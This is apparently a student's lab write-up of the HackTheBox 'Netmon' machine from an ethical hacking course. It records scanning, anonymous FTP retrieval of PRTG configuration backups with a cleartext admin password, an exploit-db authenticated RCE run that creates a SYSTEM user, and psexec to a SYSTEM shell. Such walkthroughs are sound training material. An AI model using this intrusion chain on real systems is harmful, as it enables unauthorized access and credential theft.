---
layout:     post
title:      TCM PEH Hacking Netmon Notes
date:       2021-03-26
summary:    TheCyberMentor's Practical Ethical Hacking course mid-course capstone, hacking HackTheBox Netmon
categories: certs
thumbnail: cogs
tags:
 - certs
 - pwned
---
<h2 class="code-line" data-line-start=0 data-line-end=1 ><a id="HTB_Netmon_0"></a>HTB Netmon</h2>
<p class="has-line-data" data-line-start="1" data-line-end="2">Recording actions to derive method.</p>
<p class="has-line-data" data-line-start="3" data-line-end="10">nmap -T4 -A -p- 10.10.10.152<br>
Noted open port 21 ftp<br>
Noted ftp allows anonymous login<br>
Noted ftp is basically entire Windows C:<br>
Noted open port 80 http<br>
Noted port 80 PRTG Network Monitor 18.1.37<br>
Noted Windows Server 2008 R2 OS</p>
<hr>
<p class="has-line-data" data-line-start="11" data-line-end="21">Visited <a href="http://10.10.10.152:80">http://10.10.10.152:80</a><br>
Noted PRTG Network Monitor<br>
Googled PRTG Network Monitor default credentials<br>
Found PRTG knowledgebase results prtgadmin:prtgadmin<br>
Tested creds, failed<br>
Googled prtg network monitor exploits<br>
Found exploit-db RCE (Authenticated)<br>
FTP is sharing out C:<br>
Googled prtg network monitor db file location<br>
Found prtg knowledgebase results with several locations</p>
<hr>
<p class="has-line-data" data-line-start="22" data-line-end="42">ftp 10.10.10.152<br>
anonymous<br>
Enter<br>
ls<br>
cd Users<br>
ls<br>
ls -la<br>
Noted hidden directories<br>
cd “All Users”<br>
ls -la<br>
cd “Application Data”<br>
Noted Access Denied<br>
cd “Application Data\Paessler\PRTG Network Monitor”<br>
Noted this was successful!!!<br>
ls<br>
Noted PRTG Configuration files<br>
get “PRTG Configuration.dat”<br>
get “PRTG Configuration.old”<br>
get “PRTG Configuration.old.bak”<br>
bye</p>
<hr>
<p class="has-line-data" data-line-start="43" data-line-end="62">ls | grep PRTG<br>
Noted all 3 files are here<br>
cat PRTG\ Configuration.dat | grep prtgadmin<br>
Noted the default cred is here<br>
gedit PRTG\ Configuration.dat<br>
ctrl+f<br>
prtgadmin<br>
Noted that password for prtgadmin is encrypted<br>
Closed<br>
gedit PRTG\ Configuration.old<br>
ctrl+f<br>
prtgadmin<br>
Noted that password for prtgadmin is encrypted<br>
Closed<br>
gedit PRTG\ Configuration.old.bak<br>
ctrl+f<br>
prtgadmin<br>
Noted password for prtgadmin are in clear text (ends in str 2018)<br>
Copied password</p>
<hr>
<p class="has-line-data" data-line-start="63" data-line-end="78">Went back to 10.10.10.152:80<br>
Tried password, failed<br>
Tried password with 2018 replaced with 2019, success<br>
Logged into PRTG Netmon Dashboard<br>
Noted exploit-db RCE (Authenticated) requires a cookie<br>
Opened burp<br>
Started proxy and intercept<br>
Copied exploit-db payload<br>
gedit <a href="http://new.sh">new.sh</a><br>
Pasted exploit into it<br>
Saved &amp; Exit<br>
chmod +x <a href="http://new.sh">new.sh</a><br>
./new.sh <a href="http://10.10.10.152">http://10.10.10.152</a> -c “&lt;pasted cookie here&gt;”<br>
Exploit is running, trying to create new NT\System user pentest:P3nT3st on remote machine<br>
Exploit completed</p>
<hr>
<p class="has-line-data" data-line-start="79" data-line-end="84">Installed impacket(<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a>)<br>
<a href="http://psexec.py">psexec.py</a> <a href="mailto:pentest:%22P3nT3st%22@10.10.10.152">pentest:“P3nT3st”@10.10.10.152</a><br>
Spawned a shell!!<br>
whoami<br>
nt authority\system</p>